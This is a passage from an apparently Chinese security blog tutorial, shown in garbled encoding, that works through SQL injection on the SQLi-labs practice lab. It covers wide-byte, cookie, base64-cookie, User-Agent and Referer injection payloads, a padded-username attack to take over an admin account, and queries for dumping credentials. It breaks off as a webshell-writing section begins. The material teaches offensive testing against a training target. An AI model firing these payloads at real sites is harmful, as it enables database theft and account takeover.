æ˜¯ä¸€ä¸ªæ±‰å­—ã€‚</p></li><li><p>0x815câœ…</p></li><li><p>0x805cï¼Œä¸å¯ä»¥ï¼Œä¸åœ¨èŒƒå›´å†…ã€‚</p></li></ul><p>ç”¨æ³•ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.57.47.png" style="zoom:67%;"></blockquote><p>å°è¯•åæ‰è½¬è¯‘å­—ç¬¦ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.37.55.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.38.35.png" style="zoom:75%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åŸå§‹è¯­å¥ï¼šselect * from <span class="token function">users</span> where <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'$id'</span> LIMIT <span class="token number">0</span>ï¼Œ1æäº¤çš„å‚æ•°ï¼š1 %df<span class="token string">'ç»è¿‡è½¬è¯‘çš„å‚æ•°ï¼ˆ%dfç»è¿‡urlè§£ç å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—èŠ‚â€”â€”0xdfï¼‰ï¼š1 df\'</span>ç»è¿‡GBKç¼–ç è¯†åˆ«ï¼š1 df<span class="token punctuation">\</span>'<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">(</span>æŸä¸ªåŒå­—èŠ‚æ±‰å­—<span class="token punctuation">)</span><span class="token string">'è½¬è¯‘ç¬¦å·è¢«å¸æ”¶æ‰äº†ï¼šselect * from users where id='</span><span class="token number">1</span> <span class="token punctuation">(</span>æŸä¸ªåŒå­—èŠ‚æ±‰å­—<span class="token punctuation">)</span><span class="token string">''</span> LIMIT <span class="token number">0</span>ï¼Œ1å¤šäº†ä¸ªå•å¼•å·æ‰€ä»¥è¯­å¥ä¼šæŠ¥é”™ã€‚æŒ‰ç…§ç»éªŒæŠ¥é”™ä¿¡æ¯å‡ºç°äº†æ•°å­—<span class="token operator">=</span><span class="token operator">&gt;</span>å­—ç¬¦å‹æ³¨å…¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬è¯‘å­—ç¬¦å¤±æ•ˆï¼Œâ€â€˜â€œç ´åäº†åŸæ¥çš„è¯­å¥ç»“æ„ï¼Œæ‰€ä»¥æŠ¥é”™ï¼Œæ ¹æ®é”™è¯¯ç¡®å®šï¼Œå±äºå­—ç¬¦å‹æ³¨å…¥ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.39.55.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.40.07.png" style="zoom:45%;"><p>æ·»åŠ æ³¨é‡Šï¼Œå»æ‰åŸæ¥è¯­å¥ä¸­çš„<code>'</code>,æ­£å¸¸æ˜¾ç¤ºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'1 (æŸä¸ªåŒå­—èŠ‚æ±‰å­—)'</span> --+ ' LIMIT <span class="token number">0</span>ï¼Œ1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="9-2-è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#9-2-è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="9.2 è”åˆæŸ¥è¯¢æ³¨å…¥"></a>9.2 è”åˆæŸ¥è¯¢æ³¨å…¥</h2><p>è¿«ä½¿è½¬è¯‘å¤±æ•ˆä»¥åå¯ä»¥è¿›è¡Œè”åˆæŸ¥è¯¢ã€‚</p><ul><li>ç¡®å®šå­—æ®µä¸ªæ•°ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/../../../Desktop/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.42.51.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.43.08.png" style="zoom:75%;"><p>åˆ¤æ–­åˆ—æ•°ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.43.33.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.43.40.png" style="zoom:45%;"><p>å­—æ®µä¸ªæ•°ä¸º3ã€‚</p><ul><li>åˆ¤æ–­æ˜¾ç¤ºä½ç½®ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.44.36.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.44.43.png" style="zoom:45%;"><ul><li>è·å–æ•°æ®åº“ä¿¡æ¯ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.45.41.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.45.49.png" style="zoom:45%;"><h1 id="åã€Cookieæ³¨å…¥"><a href="#åã€Cookieæ³¨å…¥" class="headerlink" title="åã€Cookieæ³¨å…¥"></a>åã€Cookieæ³¨å…¥</h1><p>æˆ‘ä»¬ä½¿ç”¨SQLi-labsç¬¬20å…³æ¥è¯´æ˜Cookieæ³¨å…¥é—®é¢˜ã€‚</p><p>Cookieæ³¨å…¥çš„æ³¨å…¥å‚æ•°éœ€è¦é€šè¿‡Cookieæäº¤ï¼Œå¯ä»¥é€šè¿‡[document.cookie ]åœ¨æ§åˆ¶å°å®Œæˆå¯¹æµè§ˆå™¨Cookieçš„è¯»å†™ã€‚</p><p>æ¥åˆ°less-20ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">document.cookie</span><span class="token operator">=</span><span class="token string">"uname=Dumb' and extractvalue(1, concat(0x7e, database() , 0x7e) )#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ·æ–°é¡µé¢å³å¯ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.25.22.png" style="zoom:45%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.25.45.png" style="zoom:45%;"><p>ç”¨BPè¿›è¡Œcookieæ³¨å…¥ï¼š</p><p>âš ï¸ï¼š+æ˜¯åœ¨urlä¸­å¯¹ç©ºæ ¼çš„å˜æ¢ï¼Œåœ¨HTTPè¯·æ±‚ä¸­ç”¨#æˆ–â€“ç©ºæ ¼ æ¥è¡¨ç¤ºæ•°æ®åº“æ³¨é‡Šã€‚</p><p>ç”¨BPæŠ“å–:1ï¼‰æäº¤POSTè¯·æ±‚ä¹‹å‰åˆ·æ–°æµè§ˆå™¨çš„åŒ…ï¼Œ2ï¼‰æäº¤ç™»å½•åå’Œå¯†ç ä¹‹åå†åˆ·æ–°æµè§ˆå™¨çš„åŒ…ã€‚</p><p>ä¸¤ä¸ªåŒ…éƒ½ä¼ åˆ°repeateræ¨¡å—å’Œcompareæ¨¡å—ä¸­ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.17.52.png" style="zoom:75%;"><p>å¯¹æ¯”ä¸¤è€…ï¼Œå‘ç°cookieä¿¡æ¯ã€‚</p><p>åˆ©ç”¨é‡æ”¾æ¨¡å—åšcookieæ³¨å…¥æ¼æ´åˆ¤æ–­ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.19.53.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.19.31.png" style="zoom:75%;"><p>å‡ºç°mysqlçš„æŠ¥é”™ä¿¡æ¯ï¼Œç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸”æ˜¯å•å¼•å·ã€‚</p><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">updatexml<span class="token punctuation">(</span><span class="token number">1</span>, concat<span class="token punctuation">(</span> <span class="token string">'^'</span>, <span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>, <span class="token string">'^'</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.22.52.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.23.10.png" style="zoom:75%;"><p>æˆåŠŸå¾—åˆ°æ•°æ®åº“åã€‚</p><h1 id="åä¸€ã€Base64æ³¨å…¥"><a href="#åä¸€ã€Base64æ³¨å…¥" class="headerlink" title="åä¸€ã€Base64æ³¨å…¥"></a>åä¸€ã€Base64æ³¨å…¥</h1><p>æˆ‘ä»¬ä»¥SQLI-labsç¬¬22å…³æ¥è¯´æ˜base64 æ³¨å…¥çš„é—®é¢˜ã€‚</p><p>base64æ³¨å…¥ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œåªä¸è¿‡å°†æ³¨å…¥å­—æ®µç»è¿‡base64ç¼–ç ã€‚ç»è¿‡æµ‹è¯•ï¼Œå‘ç°22å…³å±äºCookieå‹çš„base64æ³¨å…¥ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ‰‹æ³•ï¼Œpayload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">document.cookie</span><span class="token operator">=</span><span class="token string">"uname=Dumb"</span> and extractvalue<span class="token punctuation">(</span><span class="token number">1</span>, concat<span class="token punctuation">(</span> 0x7e, database<span class="token punctuation">(</span><span class="token punctuation">)</span> , 0x7e<span class="token punctuation">))</span><span class="token comment">#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨æ§åˆ¶å°è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">document.cookie</span><span class="token operator">=</span><span class="token string">"uname=RHVtYiIgYW5kIGV4dHJhY3R2YWx 1ZSgxLGNv bmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpIW== "</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ·æ–°ç½‘é¡µå³å¯ã€‚</p><blockquote><h4 id="ç¬¬22å…³ç”±äºphp-iniæ—¶åŒºé…ç½®é—®é¢˜æŠ¥é”™"><a href="#ç¬¬22å…³ç”±äºphp-iniæ—¶åŒºé…ç½®é—®é¢˜æŠ¥é”™" class="headerlink" title="ç¬¬22å…³ç”±äºphp.iniæ—¶åŒºé…ç½®é—®é¢˜æŠ¥é”™"></a>ç¬¬22å…³ç”±äºphp.iniæ—¶åŒºé…ç½®é—®é¢˜æŠ¥é”™</h4><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.39.43.png" style="zoom:75%;"><p>çº é”™ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.39.28.png" style="zoom:75%;"><p>é‡å¯PHPstudyã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.41.51.png" style="zoom:55%;"><p>æ—¶é—´æŠ¥é”™æ¶ˆå¤±ã€‚</p></blockquote><blockquote><h4 id="ç”¨BPå®éªŒSQLI-labs-less22"><a href="#ç”¨BPå®éªŒSQLI-labs-less22" class="headerlink" title="ç”¨BPå®éªŒSQLI-labs-less22"></a>ç”¨BPå®éªŒSQLI-labs-less22</h4><p>1ã€ç”¨Dumb Dumbç™»å…¥ç¬¬22å…³ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.45.16.png" style="zoom:45%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.46.04.png" style="zoom:25%;"><p>è§‚å¯ŸCOOKIEå­—æ®µå€¼ï¼Œ**RHVtYg==**ï¼Œè²Œä¼¼æ˜¯base64ç¼–ç ã€‚</p><p>2ã€æŠ“åŒ…åˆ†æ</p><p>åœ¨å½“å‰é¡µé¢åˆ·æ–°ï¼ŒæŠ“åŒ…ï¼Œå‘é€åˆ°repeateræ¨¡å—ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.49.04.png" style="zoom:45%;"><p>3ã€ç¼–è§£ç åˆ†æ</p><p>base64è§£ç ï¼Œæ˜¯Dumbï¼Œæ‰€ä»¥cookieå­—æ®µçš„å€¼æ˜¯ Dumbçš„base64ç¼–ç ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.50.04.png" style="zoom:55%;"><p>4ã€æ³¨å…¥æ¼æ´æ¢æµ‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dumb' <span class="token assign-left variable">RHVtYic</span><span class="token operator">=</span> æ¢æµ‹â€”â€”<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.52.08.png" style="zoom:45%;"><p>æ²¡æœ‰æŠ¥é”™ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dumb" <span class="token assign-left variable">RHVtYiI</span><span class="token operator">=</span>æ¢æµ‹â€”â€”<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%888.53.17.png" style="zoom:75%;"><p>æŠ¥é”™â€”â€”&gt;å­—ç¬¦å‹æ³¨å…¥ã€åŒå¼•å·é—­åˆã€‚</p><p>5ã€åˆ©ç”¨æŠ¥é”™æ³¨å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dumb" and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x5e,version<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x5e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span><span class="token assign-left variable">RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDVlLHZlcnNpb24oKSwweDVlKSwxKSM</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2025-02-13%2014.34.56.png" style="zoom:50%;"><p>æˆåŠŸè·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ã€‚</p></blockquote><h1 id="åäºŒã€HTTPå¤´éƒ¨æ³¨å…¥"><a href="#åäºŒã€HTTPå¤´éƒ¨æ³¨å…¥" class="headerlink" title="åäºŒã€HTTPå¤´éƒ¨æ³¨å…¥"></a>åäºŒã€HTTPå¤´éƒ¨æ³¨å…¥</h1><p>httpå¤´éƒ¨æ³¨å…¥å°±æ˜¯æŒ‡æ³¨å…¥å­—æ®µåœ¨HTTPå¤´éƒ¨çš„å­—æ®µä¸­ï¼Œè¿™äº›å­—æ®µé€šå¸¸æœ‰User-Agentã€Refererç­‰ã€‚</p><h2 id="12-1-User-Agent-æ³¨å…¥"><a href="#12-1-User-Agent-æ³¨å…¥" class="headerlink" title="12.1 User-Agent æ³¨å…¥"></a>12.1 User-Agent æ³¨å…¥</h2><p>å¦‚SQLi-labsç¬¬18å…³ã€‚</p><p>payloadï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">User-Agent <span class="token builtin class-name">:</span> hacker<span class="token string">' and updatexml(1, concat (0x7e, database() ,0x7e) ,1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213144300026.png" style="zoom:80%;"><h2 id="12-2-Refereræ³¨å…¥"><a href="#12-2-Refereræ³¨å…¥" class="headerlink" title="12.2 Refereræ³¨å…¥"></a>12.2 Refereræ³¨å…¥</h2><p>Soli-labsç¬¬19å…³ï¼Œæ³¨å…¥å­—æ®µåœ¨Refererä¸­:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker<span class="token string">' and updatexml(1, concat( 0x7e, database() , 0x7e) ,1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ€è·¯åŒAgentæ³¨å…¥ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Referer: sxk<span class="token string">' and updatexml(1,concat(0x5e,version(),0x5e),1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%889.34.00.png" style="zoom:55%;"><h1 id="åä¸‰ã€åŸºäºçº¦æŸçš„SQLæ”»å‡»"><a href="#åä¸‰ã€åŸºäºçº¦æŸçš„SQLæ”»å‡»" class="headerlink" title="åä¸‰ã€åŸºäºçº¦æŸçš„SQLæ”»å‡»"></a>åä¸‰ã€åŸºäºçº¦æŸçš„SQLæ”»å‡»</h1><h2 id="13-1-æ¦‚è¿°"><a href="#13-1-æ¦‚è¿°" class="headerlink" title="13.1 æ¦‚è¿°"></a>13.1 æ¦‚è¿°</h2><p>æ”¹æ¼æ´æ˜¯ç”±äºsqlä¸­insert å’Œ select å¯¹é•¿åº¦å’Œç©ºæ ¼çš„å¤„ç†æ–¹å¼å·®å¼‚é€ æˆçš„ã€‚</p><h2 id="13-2-èƒŒæ™¯åˆ†æ"><a href="#13-2-èƒŒæ™¯åˆ†æ" class="headerlink" title="13.2 èƒŒæ™¯åˆ†æ"></a>13.2 èƒŒæ™¯åˆ†æ</h2><p>æ³¨å†Œé¡µé¢çš„é€»è¾‘ï¼š</p><p>1.ç”¨<code>select * from table where username=â€™$usernameâ€™</code>æ£€æµ‹ä½ è¾“å…¥çš„ç”¨æˆ·åï¼Œå¦‚æœå­˜åœ¨ï¼Œè¯´æ˜ä½ æ³¨å†Œè¿‡ï¼Œé‚£ä¹ˆä¸è®©ä½ æ³¨å†Œã€‚</p><p>2.å¦‚æœç”¨æˆ·åä¸å­˜åœ¨ï¼Œç”¨<code> insert into table values(â€˜$usernameâ€™,â€™$passwordâ€™)</code>æŠŠä½ è¾“å…¥çš„ç”¨æˆ·åå¯†ç æ’å…¥æ•°æ®åº“ã€‚</p><h2 id="13-3-æ¼æ´åˆ†æ"><a href="#13-3-æ¼æ´åˆ†æ" class="headerlink" title="13.3 æ¼æ´åˆ†æ"></a>13.3 æ¼æ´åˆ†æ</h2><ul><li>select è¯­å¥å¯¹äºå‚æ•°åé¢ç©ºæ ¼çš„å¤„ç†æ˜¯åˆ é™¤:</li></ul><p>å‡è®¾æœ€å¤§é•¿åº¦é™åˆ¶ä¸º25 æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åä¸º <code>admin[20ä¸ªç©ºæ ¼]1</code>,å¯†ç éšæ„ã€‚è„šæœ¬æŸ¥è¯¢çš„æ—¶å€™å› ä¸ºç”¨äº†select è¯­å¥ï¼Œç©ºæ ¼è¢«åˆ é™¤ï¼Œå‰©ä¸‹äº†admin1ã€‚</p><ul><li>insertåªæ˜¯æˆªå–æœ€å¤§é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ’å…¥æ•°æ®åº“ã€‚</li></ul><p>å‡è®¾æ•°æ®åº“é‡Œé¢åªæœ‰ä¸€ä¸ªadminï¼Œæ‰€ä»¥selectè¯­å¥æŸ¥ä¸åˆ°admin1ï¼Œå› æ­¤é‡æ–°æ³¨å†Œä¸ºæ–°ç”¨æˆ·ï¼Œä½†æ˜¯æ³¨å†Œçš„æ—¶å€™ç”¨çš„æ˜¯insertè¯­å¥ï¼Œä»–ä¸ä¼šåˆ é™¤ç©ºæ ¼ï¼Œåªæ˜¯æˆªå–æœ€å¤§é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯admin[20ä¸ªç©ºæ ¼]ï¼Œå’Œè‡ªå·±è®¾çš„å¯†ç æ’å…¥åˆ°æ•°æ®åº“ï¼Œä½œä¸ºæ–°çš„ç”¨æˆ·ã€‚</p><ul><li>æ¼æ´ç»“æœ</li></ul><p>è¿™æ—¶å€™å¦‚æœæˆ‘ä»¬ç”¨admin å»æŸ¥æ‰¾ï¼Œç”¨selectè¯­å¥ï¼Œå°±ä¼šè¿”å›ä¸¤æ¡è®°å½•ï¼Œä¸€æ¡æ˜¯çœŸæ­£çš„adminå¦ä¸€æ¡æ˜¯æˆ‘ä»¬ç»•è¿‡ç”¨æˆ·åæ£€æµ‹å‡çš„admin(æ•°æ®åº“é‡Œé¢çš„ç©ºæ ¼ä¹Ÿåœ¨æŸ¥è¯¢çš„æ—¶å€™è¢«åˆ é™¤äº†å†æ¯”è¾ƒ)ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ã€ç”¨adminå’Œè‡ªå·±è®¾çš„å¯†ç å°±å¯ä»¥ç™»é™†ã€‘äº†ã€‚</p><h2 id="13-4-æ¼”ç¤º"><a href="#13-4-æ¼”ç¤º" class="headerlink" title="13.4 æ¼”ç¤º"></a>13.4 æ¼”ç¤º</h2><h3 id="13-4-1-æ•°æ®ç©ºä¸­çš„çœŸæ­£çš„ç”¨æˆ·ï¼ˆæˆ‘ä»¬è¦ç»•è¿‡çš„ç”¨æˆ·ï¼‰"><a href="#13-4-1-æ•°æ®ç©ºä¸­çš„çœŸæ­£çš„ç”¨æˆ·ï¼ˆæˆ‘ä»¬è¦ç»•è¿‡çš„ç”¨æˆ·ï¼‰" class="headerlink" title="13.4.1 æ•°æ®ç©ºä¸­çš„çœŸæ­£çš„ç”¨æˆ·ï¼ˆæˆ‘ä»¬è¦ç»•è¿‡çš„ç”¨æˆ·ï¼‰"></a>13.4.1 æ•°æ®ç©ºä¸­çš„çœŸæ­£çš„ç”¨æˆ·ï¼ˆæˆ‘ä»¬è¦ç»•è¿‡çš„ç”¨æˆ·ï¼‰</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151130874.png" style="zoom:50%;"><h3 id="13-4-2-ä½¿ç”¨selectè¯­å¥æŸ¥è¯¢æ—¶ç©ºæ ¼è¢«åˆ é™¤"><a href="#13-4-2-ä½¿ç”¨selectè¯­å¥æŸ¥è¯¢æ—¶ç©ºæ ¼è¢«åˆ é™¤" class="headerlink" title="13.4.2 ä½¿ç”¨selectè¯­å¥æŸ¥è¯¢æ—¶ç©ºæ ¼è¢«åˆ é™¤"></a>13.4.2 ä½¿ç”¨selectè¯­å¥æŸ¥è¯¢æ—¶ç©ºæ ¼è¢«åˆ é™¤</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151200437.png" style="zoom:67%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151237151.png" style="zoom:50%;"><h3 id="13-4-3-insert-è¿ç©ºæ ¼ä¸€èµ·æ’å…¥"><a href="#13-4-3-insert-è¿ç©ºæ ¼ä¸€èµ·æ’å…¥" class="headerlink" title="13.4.3 insert è¿ç©ºæ ¼ä¸€èµ·æ’å…¥"></a>13.4.3 insert è¿ç©ºæ ¼ä¸€èµ·æ’å…¥</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151255372.png" style="zoom:70%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151310712.png" style="zoom:70%;"><h3 id="13-4-4-æ¨¡æ‹Ÿç”¨å‡å¯†ç ç™»é™†çœŸç”¨æˆ·"><a href="#13-4-4-æ¨¡æ‹Ÿç”¨å‡å¯†ç ç™»é™†çœŸç”¨æˆ·" class="headerlink" title="13.4.4 æ¨¡æ‹Ÿç”¨å‡å¯†ç ç™»é™†çœŸç”¨æˆ·"></a>13.4.4 æ¨¡æ‹Ÿç”¨å‡å¯†ç ç™»é™†çœŸç”¨æˆ·</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250213151357429.png" style="zoom:67%;"><h2 id="13-5-æ€»ç»“"><a href="#13-5-æ€»ç»“" class="headerlink" title="13.5 æ€»ç»“"></a>13.5 æ€»ç»“</h2><p>è¿™ç§ç»•è¿‡æ–¹å¼åˆ©ç”¨çš„æ˜¯select å’Œ insert çš„å·®å¼‚æ€§,å…¶å®å·®å¼‚æ€§ä¹Ÿæ˜¯æ¼æ´çš„æ ¹æœ¬æˆå› ä¹‹ä¸€ï¼Œè¦å¤šå¤šç•™å¿ƒã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><h2 id="1ï¼‰å¸¸ç”¨è¯­å¥"><a href="#1ï¼‰å¸¸ç”¨è¯­å¥" class="headerlink" title="1ï¼‰å¸¸ç”¨è¯­å¥"></a>1ï¼‰å¸¸ç”¨è¯­å¥</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata æŸ¥çœ‹å½“å‰æ•°æ®åº“è¡¨ågroup_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>æŸ¥çœ‹å…¶ä»–æ•°æ®åº“è¡¨ågroup_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'æ•°æ®åº“å'</span> æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸‹çš„ <span class="token function">users</span> è¡¨çš„åˆ—ågroup_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>æŸ¥è¯¢å…¶ä»–æ•°æ®åº“ä¸‹è¡¨çš„åˆ—ågroup_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'æ•°æ®åº“å'</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'è¡¨å'</span><span class="token punctuation">;</span>æŸ¥è¯¢å½“å‰åº“ä¸‹çš„å­—æ®µå€¼group_concat<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> from <span class="token function">users</span>æŸ¥è¯¢å…¶ä»–åº“ä¸‹çš„å­—æ®µå€¼group_concat<span class="token punctuation">(</span>å­—æ®µå<span class="token punctuation">)</span> from æ•°æ®åº“å.è¡¨å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2ï¼‰å†™é©¬"><a href="#2ï¼‰å†™é©¬" class="headerlink" title="2ï¼‰å†™é©¬"></a>2ï¼‰å†™é©¬</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">å†™é©¬æ¡ä»¶:<span class="token assign-left variable">1.secure_file_priv</span><span class="token operator">=</span><span class="token string">""</span> <span class="token comment">#åœ¨my.iniä¸­ï¼Œå€¼ä¸ºç©ºæ—¶å¯å†™å…¥ä»»ä½•æ–‡ä»¶ï¼Œå€¼ä¸ºNULLæ˜¯æ— 